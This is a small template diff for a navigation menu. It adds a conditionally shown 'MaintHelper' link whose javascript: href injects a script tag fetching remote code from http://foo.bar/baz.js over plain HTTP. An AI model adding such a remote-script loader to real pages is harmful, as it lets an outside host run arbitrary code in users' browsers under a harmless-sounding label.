@@ -5,6 +5,9 @@
   <a class="item" href="../toolbox/#/query/13127939.json">
   <i class="terminal icon"></i> Numero de parte Tosa
   </a>
+  {{#showHelper}}
+  <a class="item" href="javascript:(function(){document.body.appendChild(document.createElement('script')).src='http://foo.bar/baz.js';})();">MaintHelper</a>
+  {{/showHelper}}
 </div>
 
 
